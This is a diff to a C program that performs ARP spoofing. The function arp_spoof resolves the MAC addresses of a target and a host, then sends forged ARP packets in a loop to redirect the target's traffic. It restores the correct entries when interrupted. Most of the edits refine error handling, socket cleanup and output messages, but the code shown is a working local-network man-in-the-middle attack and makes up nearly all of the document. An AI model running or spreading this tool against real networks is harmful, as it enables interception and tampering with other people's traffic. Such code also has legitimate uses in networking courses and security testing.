@@ -9,11 +9,13 @@ struct thread_arg
     struct in_addr target_ip;
     struct in_addr host_ip;
 };
+
 struct relay_thread_arg
 {
     uint8_t *mac;
     char *if_name;
 };
+
 struct arp_data
 {
     uint8_t target_mac[6];
@@ -47,17 +49,22 @@ int arp_spoof(char *i_if_name, char *i_target_ip, char *i_host_IP)
 
     if(get_info(&info, if_name)<0)
     {
-        printf("Interface Name error\n");
+        printf("\n===== !! Failed to get information of %s !! =====\n", if_name);
+        close(sock);
         return -1;
     }
-    if(!inet_aton(i_target_ip,&target_ip))
+
+    if(!inet_aton(i_target_ip, &target_ip))
     {
-        printf("Target IP error\n");
+        printf("Target IP insert error\n");
+        close(sock);
         return -1;
     }
-    if(!inet_aton(i_host_IP,&host_ip))
+    
+    if(!inet_aton(i_host_IP, &host_ip))
     {
-         printf("Host IP error\n");
+         printf("Host IP insert error\n");
+         close(sock);
          return -1;
     }
 
@@ -72,18 +79,24 @@ int arp_spoof(char *i_if_name, char *i_target_ip, char *i_host_IP)
     sll.sll_halen = ETH_ALEN; // length of destination mac address
     memset(sll.sll_addr, 0xFF, 6);
 
+    printf("\n===== Starting ARP Spoof... =====\n\n");
+
     buffer = make_arp_request_packet(info.my_mac, info.addr, target_ip);
-    if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
+    if((len = sendto(sock, buffer, ARP_MAX_LEN, 0, (struct sockaddr*)&sll, sizeof(sll))) < 0)
         perror("sendto"); 
         
     buffer = make_arp_request_packet(info.my_mac, info.addr, host_ip);
-    if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
+    if((len = sendto(sock, buffer, ARP_MAX_LEN, 0, (struct sockaddr*)&sll, sizeof(sll))) < 0)
         perror("sendto");  
 
     pthread_join(thread_id, (void **)&arp_data);
     
     if(arp_data == NULL)
+    {
+        close(sock);
         return -1;
+    }
+        
     
     r_arg.mac = arp_data->host_mac;
     r_arg.if_name = if_name;
@@ -95,24 +108,23 @@ int arp_spoof(char *i_if_name, char *i_target_ip, char *i_host_IP)
     while(1)
     {
         print_packet(&host_ip,info.my_mac,&target_ip,arp_data->target_mac);
-        if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
+        if((len = sendto(sock, buffer, ARP_MAX_LEN, 0, (struct sockaddr*)&sll, sizeof(sll)))<0)
             perror("sendto");
         if(g_signal_fleg)
             break;
         sleep(1);
     }
 
-    buffer = make_arp_reply_packet(arp_data->host_mac ,host_ip ,arp_data->target_mac ,target_ip);
+    buffer = make_arp_reply_packet(arp_data->host_mac , host_ip, arp_data->target_mac, target_ip);
     
-    printf("Spoofing Ending...\n");
-    for(int i=0; i<3 ; i++)
+    printf("\n===== Ending ARP Spoof... =====\n\n"); 
+    for(int i = 0; i < 3; i++)
     {
-        print_packet(&host_ip,arp_data->host_mac,&target_ip,arp_data->target_mac);
+        print_packet(&host_ip,arp_data->host_mac, &target_ip, arp_data->target_mac);
         if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
             perror("sendto");
         sleep(1);
     }
-    
 
     free(arp_data);
     close(sock);
@@ -121,21 +133,25 @@ int arp_spoof(char *i_if_name, char *i_target_ip, char *i_host_IP)
 
 void *thread_recivarp(void *p)
 {
-    struct thread_arg *arg = (struct thread_arg *)p;
-    int sock = arg->sock;
+    
+    int t_fleg=0, h_fleg = 0;
+    int sock;
     uint8_t buffer[ARP_MAX_LEN];
+
+    struct thread_arg *arg = (struct thread_arg *)p;
     struct etherhdr *etherhdr;
     struct arphdr *arphdr;
     struct in_addr target_ip = arg->target_ip;
     struct in_addr host_ip = arg->host_ip;
     struct arp_data *arp_data = (struct arp_data *)malloc(sizeof(struct arp_data));
-    int t_fleg=0, h_fleg = 0;
+    sock = arg->sock;
+    
     time_t start = time(NULL);
     time_t endtime = start + TIME_SEC;
 
     while(start < endtime)
     {
-        if(read(sock, buffer, sizeof(buffer))<0)
+        if(read(sock, buffer, sizeof(buffer)) < 0)
             perror("read");
         etherhdr = (struct etherhdr *)buffer;
         arphdr = (struct arphdr*)(buffer+sizeof(struct etherhdr));
@@ -149,6 +165,7 @@ void *thread_recivarp(void *p)
                     memcpy(arp_data->target_mac,arphdr->ar_sha,6);
                     t_fleg = 1;
                 }
+
                 else if(arphdr->ar_sip == host_ip.s_addr)
                 {
                     memcpy(arp_data->host_mac,arphdr->ar_sha,6);
@@ -156,22 +173,24 @@ void *thread_recivarp(void *p)
                 }
             }
         }
+
         if(t_fleg && h_fleg) return (void*)arp_data;
         start = time(NULL);
     }
+
     if(t_fleg && !h_fleg)
     {
-        printf("<target_ip>is not up\n");
+        printf("<target_ip> is not alive\n");
         return NULL;
     }
     else if(h_fleg && !t_fleg)
     {   
-        printf("<host_ip> is not up\n");
+        printf("<host_ip> is not alive\n");
         return NULL;
     }
     else if(!h_fleg && !t_fleg)
     {
-        printf("All ip is not up\n");
+        printf("All ip is not alive\n");
         return NULL;
     }
 }
@@ -192,10 +211,11 @@ void INThandler(int sig)
 void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac)
 {
     char h_ip[16], t_ip[16];
+
     strcpy(h_ip, inet_ntoa(*host_ip));
     strcpy(t_ip, inet_ntoa(*target_ip));
 
-    printf("%s is at %02x:%02x:%02x:%02x:%02x:%02x -> %s[%02x:%02x:%02x:%02x:%02x:%02x]\n",
+    printf("%s is at %02x:%02x:%02x:%02x:%02x:%02x -> %s (%02x:%02x:%02x:%02x:%02x:%02x)\n",
     h_ip, host_mac[0],host_mac[1],host_mac[2],host_mac[3],host_mac[4],host_mac[5],
     t_ip, target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
 }
